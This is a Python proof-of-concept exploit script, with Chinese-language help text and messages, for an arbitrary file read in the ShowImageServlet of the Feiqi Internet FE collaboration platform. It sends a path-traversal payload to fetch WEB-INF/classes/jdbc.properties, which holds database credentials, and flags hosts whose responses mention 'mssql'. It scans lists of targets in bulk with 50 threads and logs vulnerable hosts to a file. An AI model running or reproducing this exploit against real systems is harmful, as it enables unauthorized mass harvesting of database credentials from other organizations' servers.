import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    test = """
███████╗███████╗      ██████╗ ███████╗ █████╗ ██████╗ 
██╔════╝██╔════╝      ██╔══██╗██╔════╝██╔══██╗██╔══██╗
███████╗███████╗█████╗██████╔╝█████╗  ███████║██║  ██║
╚════██║╚════██║╚════╝██╔══██╗██╔══╝  ██╔══██║██║  ██║
███████║███████║      ██║  ██║███████╗██║  ██║██████╔╝
╚══════╝╚══════╝      ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 

"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='飞企互联FE业务协作平台ShowImageServlet任意文件读取POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and 'mssql' in response.text:
            print(f"[+]{target} 存在任意文件读取漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        print(f"[x]{target} 该站点无法访问")
